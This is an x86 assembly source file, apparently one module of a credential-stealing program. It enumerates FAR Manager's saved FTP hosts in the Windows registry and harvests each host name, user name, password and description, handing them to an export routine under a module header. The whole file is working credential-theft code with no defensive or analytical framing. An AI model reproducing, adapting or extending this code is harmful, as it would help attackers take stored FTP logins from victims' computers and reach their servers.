; FAR Manager
; Tested on:
;	FAR 1.70 beta 5

.data
	@AllocStr <szFarKeyPath>,	<"SOFTWARE\Far\Plugins\FTP\Hosts">
	@AllocStr <szFarHost>,		<"HostName">
	@AllocStr <szFarDesc>,		<"Description">
	@AllocStr <szFarUser>,		<"User">
	@AllocStr <szFarPass>,		<"Password">
	@AllocMem <lpFarCommonBuf>, 	<MAX_PATH+1>
	@AllocMem <lpFarCommonBuf2>, 	<MAX_PATH+1>

.code

GetFarData proc szRegVal, dwType: DWORD
	LOCAL	dwBufLen: DWORD

	mov     dwBufLen, MAX_PATH
	invoke	RegReadValue, HKEY_CURRENT_USER, offset lpFarCommonBuf, szRegVal, offset lpFarCommonBuf2, addr dwBufLen
	.IF	eax
		invoke	ExportData, dwType, 0, offset lpFarCommonBuf2, dwBufLen
	.ENDIF
	
	ret
GetFarData endp

GetFarOutput proc
	LOCAL	hkHandle, KeyIndex, dwBufLen: DWORD

	; Write header
	invoke	ExportModule, MODULE_FAR
	
	invoke  RegOpenKey, HKEY_CURRENT_USER, offset szFarKeyPath, addr hkHandle
	test	eax, eax
	jnz	@ret
	
	; Enum registry entries
	mov	KeyIndex, 0
@enum:
        mov     dwBufLen, MAX_PATH-szFarKeyPathLen-1
        xor	eax, eax
        invoke  RegEnumKeyEx, hkHandle, KeyIndex, offset lpFarCommonBuf[szFarKeyPathLen+1], addr dwBufLen, eax, eax, eax, eax
        test	eax, eax
        jnz	@enum_end

	; Item name, some old Far versions store passwords & hosts there
	invoke	ExportStr, TYPE_FAR_NAME, 0, offset lpFarCommonBuf[szFarKeyPathLen+1]
	
        ; Make the path
	invoke	lstrcpy, offset lpFarCommonBuf, offset szFarKeyPath
	mov	byte ptr lpFarCommonBuf[szFarKeyPathLen], '\'

	; Host
	invoke	GetFarData, offset szFarHost, TYPE_FAR_HOST
	; User
	invoke	GetFarData, offset szFarUser, TYPE_FAR_USER
	; Pass
	invoke	GetFarData, offset szFarPass, TYPE_FAR_PASS
	; Description
	invoke	GetFarData, offset szFarDesc, TYPE_FAR_DESC

	inc	KeyIndex
	jmp	@enum
	
@enum_end:	
	invoke	RegCloseKey, hkHandle

@ret:
	ret
GetFarOutput endp